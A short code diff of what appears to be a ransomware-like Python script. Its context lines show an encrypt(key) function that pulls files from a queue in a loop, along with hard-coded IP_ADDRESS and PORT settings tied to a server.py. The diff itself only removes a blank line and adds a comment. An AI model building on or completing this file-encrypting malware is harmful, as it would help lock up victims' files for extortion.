@@ -5,7 +5,6 @@ import queue
 import random
 
 # Encryption
-
 def encrypt(key):
     while true:
         file = q.get()
@@ -34,6 +33,7 @@ def encrypt(key):
             print('Error')
         q.task_done()
         
+# changing server.py, change here also :O
 IP_ADDRESS = '192.168.1.0'
 PORT = 5678
 
